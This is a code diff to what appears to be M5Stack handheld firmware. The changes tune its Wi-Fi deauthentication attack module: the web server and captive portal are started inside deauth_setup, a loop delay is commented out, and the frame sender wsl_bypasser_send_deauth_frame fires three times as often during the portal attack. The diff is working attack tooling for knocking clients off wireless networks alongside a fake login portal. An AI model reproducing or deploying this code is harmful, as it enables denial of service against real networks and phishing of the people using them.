@@ -64,8 +64,8 @@ String buildver="2.3.4b";
   #define SDCARD   //Requires a custom-built adapter and sd_stick.h file
   // -=-=- ALIASES -=-=-
   #define DISP M5.Lcd
-  #define IRLED 19
   #define BITMAP M5.Lcd.drawBmp(NEMOMatrix, 97338)
+  #define IRLED 19
   #define M5_BUTTON_MENU 35
   #define M5_BUTTON_HOME 37
   #define M5_BUTTON_RST 39
@@ -1723,6 +1723,10 @@ void wsAmenu_loop() {
 // DEAUTH ATTACK START
 #if defined(DEAUTHER)
   void deauth_setup(){
+    setupWiFi();
+    setupWebServer();
+    portal_active = false;
+
     DISP.fillScreen(BGCOLOR);
     DISP.setCursor(0, 5, 1);
     DISP.setTextSize(BIG_TEXT);
@@ -1739,7 +1743,6 @@ void wsAmenu_loop() {
     rstOverride = false;
     delay(500); // Prevent switching after menu loads up
   }
-
   void deauth_loop(){
 
     if (target_deauth == true) {                                                                 // DEAUTH
@@ -1757,7 +1760,7 @@ void wsAmenu_loop() {
       DISP.setTextColor(FGCOLOR, BGCOLOR);                                                       // DEAUTH
     }                                                                                            // DEAUTH
 
-    delay(200);
+    //delay(20); //from 200
 
     if (check_select_press()){                                                                    // DEAUTH
       target_deauth = !target_deauth;                                                             // DEAUTH
@@ -1767,6 +1770,7 @@ void wsAmenu_loop() {
     }                                                                                             // DEAUTH
 
     if (check_next_press()){
+      shutdownWebServer();
       rstOverride = false;
       isSwitching = true;
       target_deauth = false;                                                                      // DEAUTH
@@ -1881,7 +1885,7 @@ void portal_loop(){
     #if defined(DEAUTHER)
       if (target_deauth_flg) {
         if (target_deauth == true) {                                                                 // DEAUTH
-          if (deauth_tick==45) {                // 45 is +-150ms   (Add delay to attack, without reflection on portal)
+          if (deauth_tick==15) {                // 45 is +-150ms   (Add delay to attack, without reflection on portal)
             wsl_bypasser_send_deauth_frame(&ap_record, channel);                                     // DEAUTH   
             deauth_tick=0;
           } else { 
